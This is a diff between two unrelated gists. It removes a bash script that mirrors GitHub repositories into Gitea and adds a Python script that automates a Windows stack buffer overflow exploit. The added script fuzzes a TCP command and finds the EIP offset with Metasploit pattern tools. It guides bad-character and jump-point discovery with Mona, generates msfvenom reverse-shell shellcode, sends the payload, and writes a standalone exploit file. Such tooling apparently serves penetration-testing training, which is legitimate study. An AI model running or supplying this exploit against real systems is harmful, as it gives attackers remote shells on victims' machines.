@@ -1,38 +1,174 @@
-#date: 2023-11-09T16:42:25Z
-#url: https://api.github.com/gists/f9f2185a8038b207e3e444e123bdf52e
-#owner: https://api.github.com/users/Leinnan
+#date: 2023-11-10T16:46:47Z
+#url: https://api.github.com/gists/710a0710e2f7eea45154cbdcf9d7f972
+#owner: https://api.github.com/users/wilco375
 
-#!/bin/bash
+#!/usr/bin/python
 
-GITHUB_USERNAME=
- "**********"G "**********"I "**********"T "**********"H "**********"U "**********"B "**********"_ "**********"T "**********"O "**********"K "**********"E "**********"N "**********"= "**********"
+# Script to help with the exploitation of a buffer overflow in a TCP command of a Windows binary to get a reverse shell
+# Used in combination with Immunity Debugger and Mona, and will guide you through the steps of finding the offset, bad characters, jump point and generating shellcode 
 
-GITEA_USERNAME=
- "**********"G "**********"I "**********"T "**********"E "**********"A "**********"_ "**********"T "**********"O "**********"K "**********"E "**********"N "**********"= "**********"
-GITEA_DOMAIN=
-GITEA_REPO_OWNER=
+import sys, socket
+from time import sleep
+import subprocess
+import os
 
-prefix=https://github.com/$GITHUB_USERNAME/
+if len(sys.argv) < 4:
+    print("Usage: python3 buffer-overflow.py <target-ip:port> <local-ip:listener-port> <vulnerable-command>")
+    sys.exit()
 
-GET_REPOS=$(curl -H 'Accept: "**********":$GITHUB_TOKEN -s "https://api.github.com/users/$GITHUB_USERNAME/repos?per_page=200&type=all" | jq -r '.[].html_url')
+ip = sys.argv[1].split(':')[0]
+port = int(sys.argv[1].split(':')[1])
+local_ip = sys.argv[2].split(':')[0]
+local_port = int(sys.argv[2].split(':')[1])
+prefix = sys.argv[3] + ' '
 
-for URL in $GET_REPOS; do
+timeout = 5
 
-    REPO_NAME=${URL/#$prefix}
+def send_payload(payload, recv_after_send=False) -> bool:
+    if isinstance(payload, str):
+        payload = payload.encode('latin-1')
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            s.connect((ip, port))
+            s.recv(1024)
+            s.send(payload)
+            if recv_after_send:
+                s.recv(1024)
+            return True
+    except:
+        return False
 
-    echo "Found $REPO_NAME, importing..."
+def fuzz():
+    print('=== Finding approxmimate offset ===')
+    buffer = 'A' * 100
+    
+    input('[!] Please make sure the target is running and press enter to continue...')
 
-    curl -X POST "https: "**********":$GITEA_TOKEN -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \
-    \"auth_username\": \"$GITHUB_USERNAME\", \
-    \"auth_password\": "**********"
-    \"clone_addr\": \"$URL\", \
-    \"mirror\": false, \
-    \"private\": true, \
-    \"repo_name\": \"$REPO_NAME\", \
-    \"repo_owner\": \"$GITEA_REPO_OWNER\", \
-    \"service\": \"git\", \
-    \"uid\": 0, \
-    \"wiki\": true}"
+    while True:
+        print(f"[+] Sending payload of size {len(buffer)}...")
+        if not send_payload(prefix + buffer, True):
+            print("The fuzzing crashed at %s bytes" % str(len(buffer)))
+            return len(buffer)
+        
+        sleep(0.5)
+        buffer = buffer + "A"*100
 
-done
+def find_offset(approx_offset):
+    print('\n=== Finding exact offset ===')
+    pattern = subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l', str(approx_offset)]).decode('utf-8').strip()
 
+    input('[!] Please make sure the target is running in Immunity Debugger and press enter to continue...')
+
+    print(f"[+] Sending payload...")
+    send_payload(prefix + pattern)
+
+    eip = input("[!] Please enter the hex value of EIP: ")
+
+    if eip.strip() == '':
+        print("[-] EIP value not provided, retrying")
+        return False
+
+    offset = int(subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb', '-l', str(approx_offset), '-q', eip]).decode('utf-8').strip().split(' ')[-1])
+
+    print(f"[!] EIP offset: {offset}")
+
+    return offset
+
+def bad_chars(offset, badchars=b'\x00'):
+    print('\n=== Finding bad characters ===')
+    
+    buffer = 'A' * offset
+    buffer += 'BBBB'
+    buffer += ''.join([chr(char) for char in range(0,256) if char not in badchars])
+
+    input('[!] Please make sure the target is running in Immunity Debugger and press enter to continue...')
+
+    print(f"[+] Sending payload...")
+    send_payload(prefix + buffer)
+
+    print("[+] You can use the following mona commands to find bad characters:")
+    print('!mona config -set workingfolder c:\mona')
+    badchars_str = ''.join(['\\x%02x' % char for char in badchars])
+    print(f'!mona bytearray -cpb "{badchars_str}"')
+    print('!mona compare -f C:\\mona\\bytearray.bin -a <ESP address>')
+
+    newbadchars = input("[!] Please enter the (new) bad characters found by mona (if any), e.g. \\x12\\x4b: ").strip()
+    newbadchars = bytes.fromhex(newbadchars.strip().replace('\\x', ''))
+
+    # For each badchars not in newbadchars, add it to badchars
+    for char in badchars[::-1]:
+        if char not in newbadchars:
+            newbadchars += bytes([char])
+
+    # Sort the badchars
+    newbadchars = sorted(newbadchars)
+    
+    return newbadchars
+
+def jump_point(badchars):
+    print("\n=== Finding jump point ===")
+    print("[+] You can use the following mona command to find a jump point:")
+    badchars_str = ''.join(['\\x%02x' % char for char in badchars])
+    print(f'!mona jmp -r esp -cpb "{badchars_str}"')
+
+    jumppoint = input("[!] Please enter the jump point address as hex: ").strip()
+
+    return jumppoint
+
+def shellcode(offset, badchars, jumppoint):
+    print('\n=== Generating and sending shellcode ===')
+
+    badchars_str = ''.join(['\\x%02x' % char for char in badchars])
+    shellcode = subprocess.check_output(['msfvenom', '-p', 'windows/shell_reverse_tcp', f'LHOST={local_ip}', f'LPORT={local_port}', 'EXITFUNC=thread', '-f', 'raw', '-a', 'x86', '-b', badchars_str])
+    # Payload = command + padding to offset + jump point + NOP sled + shellcode
+    payload = prefix.encode('latin-1') + (b'A' * offset) + bytes.fromhex(jumppoint)[::-1] + (b'\x90' * 32) + shellcode
+
+    print('[!] Outputting exploit to exploit.py')
+    filename = 'exploit.py'
+    if os.path.exists('exploit.py'):
+        filename = input('exploit.py already exists, please enter a filename: ')
+    with open(filename, 'w') as f:
+        f.write('#!/usr/bin/python\n\n')
+        f.write('import sys, socket\n\n')
+        f.write(f"ip = '{ip}'\n")
+        f.write(f"port = {port}\n")
+        payload_str = ''.join(['\\x%02x' % char for char in payload])
+        f.write(f"payload = '{payload_str}'\n\n")
+        f.write('try:\n')
+        f.write('    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n')
+        f.write('        s.connect((ip, port))\n')
+        f.write('        s.send(payload.encode(\'latin-1\'))\n')
+        f.write('        sys.exit()\n')
+        f.write('except:\n')
+        f.write('    print("Error connecting to server")\n')
+        f.write('    sys.exit()\n')
+    
+    input('[!] Please make sure the target and your listener are running and press enter to send shellcode...')
+
+    send_payload(payload)
+
+approx_offset = fuzz()
+
+while True:
+    offset = find_offset(approx_offset)
+    if offset is not False:
+        break
+
+badchars = b'\x00'
+while True:
+    newbadchars = bad_chars(offset, badchars)
+    
+    if newbadchars != badchars:
+        result = input("[!] Do you want to validate the bad characters? (y/n): ").strip().lower()
+        if result == 'n':
+            break
+    else:
+        break
+
+badchars_str = ''.join(['\\x%02x' % char for char in badchars])
+print(f"[!] Bad characters: {badchars_str}")
+
+jumppoint = jump_point(badchars)
+
+shellcode(offset, badchars, jumppoint)
